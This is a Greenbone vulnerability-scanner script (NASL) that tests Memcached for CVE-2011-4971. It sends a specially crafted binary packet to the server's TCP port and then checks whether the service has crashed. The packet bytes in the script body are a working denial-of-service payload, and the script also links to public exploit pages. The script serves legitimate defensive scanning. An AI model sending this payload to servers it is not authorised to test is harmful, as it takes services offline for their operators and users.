# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:memcached:memcached";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902966");
  script_version("2025-03-05T05:38:53+0000");
  script_cve_id("CVE-2011-4971");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:53 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2013-04-30 12:50:48 +0530 (Tue, 30 Apr 2013)");
  script_name("Memcached < 1.4.17 Remote DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_memcached_detect.nasl");
  script_mandatory_keys("memcached/tcp/detected");

  script_xref(name:"URL", value:"http://insecurety.net/?p=872");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121445/killthebox.py.txt");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/memcached-remote-denial-of-service");

  script_tag(name:"summary", value:"Memcached is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause
  denial of service.");

  script_tag(name:"affected", value:"Memcached version 1.4.15 and prior.");

  script_tag(name:"insight", value:"The flaw is due to an error in handling of a specially crafted
  packet, that results to the Memcached segfault and essentially die.");

  script_tag(name:"solution", value:"Update to version 1.4.17 or later.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! infos = get_app_location_and_proto( cpe:CPE, port:port ) )
  exit( 0 );

proto = infos["proto"];
if( proto == "udp" )
  exit( 0 ); # Currently only TCP is covered below

if( ! soc = open_sock_tcp( port ) )
  exit( 0 );

data = string( "\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8",
               crap(data:raw_string(0x00), length:50 ) );

send( socket:soc, data:data );
close( soc );
sleep( 2 );

## If not able to create socket then application died.
soc2 = open_sock_tcp( port );
if( ! soc2 ) {
  security_message( port:port );
  exit( 0 );
}

close( soc2 );
exit( 99 );